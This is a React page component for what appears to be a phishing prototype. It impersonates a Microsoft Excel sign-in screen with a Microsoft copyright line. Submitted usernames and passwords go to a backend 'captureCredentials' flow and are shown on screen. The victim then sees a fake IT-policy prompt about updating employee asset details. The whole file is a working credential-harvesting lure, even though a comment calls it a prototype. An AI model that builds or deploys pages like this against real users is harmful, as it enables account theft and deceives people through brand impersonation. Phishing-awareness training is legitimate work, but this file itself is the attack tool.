'use client';
import { FormEvent, useState } from 'react';
import { captureCredentials } from '@/ai/flows/capture-credentials';
import type { CredentialsInput } from '@/ai/types/credentials';

// Make Swal available in the component
declare const Swal: any;

export default function Home() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [captured, setCaptured] = useState<CredentialsInput | null>(null);

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    
    // Capture credentials on the backend
    const capturedCreds = await captureCredentials({ username, password });
    setCaptured(capturedCreds);
    
    // Show SweetAlert2 prompt
    Swal.fire({
      title: "Action Required: Employee Asset Details",
      text: "Please review and update your asset information in accordance with the new IT policy.",
      icon: "info",
      confirmButtonText: "Update Now",
      confirmButtonColor: "#3085d6",
      background: "#fff",
      color: "#333"
    }).then(() => {
      // In a real scenario, you would redirect. For this prototype, we do nothing.
      console.log("Alert closed. Would redirect to employee-asset-update.html");
    });
  };
  
  return (
    <>
      {/* Login Overlay */}
      <div className="login-overlay" role="main" aria-label="Excel Login Screen">
        
        <h2>Sign in to Excel</h2>
        <form onSubmit={handleSubmit}>
          <input 
            type="text" 
            name="username" 
            placeholder="Email or phone" 
            autoComplete="username" 
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required 
          />
          <input 
            type="password" 
            name="password" 
            placeholder="Password" 
            autoComplete="current-password" 
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required 
          />
          <button type="submit">Sign in</button>
          <small>© Microsoft Corporation</small>
        </form>
      </div>

      {captured && (
        <div style={{
          position: 'absolute',
          bottom: '20px',
          left: '20px',
          background: 'rgba(0, 0, 0, 0.7)',
          color: 'white',
          padding: '15px',
          borderRadius: '8px',
          zIndex: 20,
          maxWidth: '300px'
        }}>
          <h3>Last Captured Credentials:</h3>
          <p><strong>Username:</strong> {captured.username}</p>
          <p><strong>Password:</strong> {captured.password}</p>
        </div>
      )}
    </>
  );
}
